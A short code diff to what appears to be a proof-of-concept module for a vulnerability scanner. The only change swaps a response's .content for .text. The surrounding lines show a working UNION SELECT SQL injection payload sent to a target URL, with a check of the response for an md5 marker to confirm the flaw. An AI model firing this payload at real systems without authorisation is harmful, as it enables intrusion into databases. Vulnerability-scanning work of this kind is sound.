@@ -51,7 +51,7 @@ class Poc(ABPoc):
                        '&Location=Social&StoreLocation=1~1+UNION+SELECT+1,2,3,4,md5(233),6,7,8,9,10'
                        ',11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--')
             verify_url = url + payload
-            content = requests.get(verify_url).content
+            content = requests.get(verify_url).text
             if 'e165421110ba03099a1c0393373c5b43' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
